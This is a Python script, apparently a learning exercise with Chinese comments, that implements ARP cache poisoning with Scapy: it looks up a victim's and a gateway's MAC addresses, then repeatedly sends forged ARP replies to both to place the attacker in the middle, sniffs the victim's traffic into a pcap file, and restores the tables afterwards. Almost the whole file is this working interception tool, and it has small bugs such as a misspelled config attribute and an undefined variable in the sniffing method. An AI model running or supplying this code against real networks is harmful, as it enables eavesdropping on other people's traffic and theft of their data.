from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr,
                       send, sniff, sndrcv, srp, wrpcap)
import os
import sys
import time

def get_mac(ip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has', pdst=ip)
    print(packet.psrc)
    packet.hwdst = 'ff:ff:ff:ff:ff:ff'
    print(packet.hwsrc)
    print(packet.pdst)
    print(packet.hwdst)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None


class Arper:
    def __init__(self, victim, gateway, interface='en0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.ifaca = interface
        conf.verb = 0

        print(f'gateway {self.gateway} is at {self.gatewaymac}')
        print(f'victim {self.victim} is at {self.victimmac}')
        print('-'*30)

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        # self.sniff_thread = Process(target=self.sniff)
        # self.sniff_thread.start()

    def poison(self):
        # 创建发送给victim的桢
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f'poison: src ip: {poison_victim.psrc}, src mac: {poison_victim.hwsrc}')
        print(f'poison: dst ip: {poison_victim.pdst}, dst mac: {poison_victim.hwdst}')
        print(poison_victim.summary())
        print('-'*30)
        # 创建发送给网关的桢
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac
        print(f'poison: src ip: {poison_gateway.psrc}, src mac: {poison_gateway.hwsrc}')
        print(f'poison: dst ip: {poison_gateway.pdst}, dst mac: {poison_gateway.hwdst}')
        print(poison_gateway.summary())
        print('-'*30)

        while True:
            sys.stdout.write('.')
            sys.stdout.flush()

            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    def sniff(self, count=200):
        time.sleep(5)
        print(f'Sniffing {count} packets')
        bpf_filter = f'ip host {victim}'
        packets = sniff(filter=bpf_filter, count=count)
        wrpcap('arper.pcap', packets)
        print(f'Got the packets')
        self.restore()
        self.poison_thread.terminate()
        print('Finished.')

    def restore(self):
        print(f'Restoring ARP tables...')

        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.hwsrc = self.gatewaymac
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f'restore: src ip: {poison_victim.psrc}, src mac: {poison_victim.hwsrc}')
        print(f'restore: dst ip: {poison_victim.pdst}, dst mac: {poison_victim.hwdst}')
        print(poison_victim.summary())
        print('-' * 30)
        # 创建发送给网关的桢
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.hwsrc = self.victimmac
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac
        print(f'restore: src ip: {poison_gateway.psrc}, src mac: {poison_gateway.hwsrc}')
        print(f'restore: dst ip: {poison_gateway.pdst}, dst mac: {poison_gateway.hwdst}')
        print(poison_gateway.summary())
        print('-' * 30)

        send(poison_victim)
        send(poison_gateway)


if __name__ == '__main__':
    print(get_mac('192.168.111.1'))
    # (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    # victim, gateway, interface = '192.168.111.220', '192.168.111.1', 'WLAN'
    # myarp = Arper(victim, gateway, interface)

    # myarp.run()
